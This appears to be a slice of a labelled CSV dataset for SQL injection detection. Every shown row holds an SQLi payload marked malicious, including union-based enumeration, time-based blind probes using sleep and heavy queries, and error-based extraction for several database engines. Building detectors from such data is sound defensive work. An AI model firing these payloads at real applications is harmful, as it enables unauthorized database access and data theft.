row_index,payload_norm,label,sqli_type_hint
5370,"1' where 3125 = 3125 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,
5371,"-6108' ) union all select 2519,2519,2519,2519--",1,
5372,"1"" ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5373,"1"" ) where 2839 = 2839 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
5374,"-6848"" ) ) or 4071 = 5312",1,
5375,"1"" ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
5376,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null--",1,
5377,( select * from ( select ( sleep ( 5 ) ) ) srmq ) #,1,
5378,1'+ ( select 'stsu' where 2386 = 2386 or sleep ( 5 ) #,1,
5379,"1 ) where 9149 = 9149 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,
5380,-5470' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'oeam' = 'oeam,1,
5381,1'|| ( select 'hlxd' from dual where 2615 = 2615 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||',1,
5382,-4583' ) as evbo where 6055 = 6055 union all select 6055--,1,
5383,"1%' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '",1,
5384,1'|| ( select 'kptj' from dual where 5123 = 5123,1,
5385,"-3126 ) ) union all select 6718,6718,6718,6718,6718--",1,
5386,"-7448 union all select 4072,4072#",1,
5387,"1"" ) ) and 9800 = 8713",1,
5388,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'fvda' like 'fvda",1,
5389,"1' in boolean mode ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) #",1,
5390,"-3194"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""erua"" = ""erua",1,
5391,"-4919 ) union all select 2608,2608,2608,2608,2608,2608#",1,
5392,"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )",1,
5393,"-2434' ) ) ) union all select 5509,5509,5509,5509,5509,5509,5509--",1,
5394,"-7568"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""jxge"" like ""jxge",1,
5395,"1"" where 7015 = 7015 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",1,
5396,"1"" ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""hbgv"" = ""hbgv",1,
5397,"-1869"" ) ) ) union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",1,
5398,-8004%' ) or ( 2301 = 7504 ) *7504 and ( '%' = ',1,
5399,"iif ( 1378 = 6569,1,1/0 )",1,
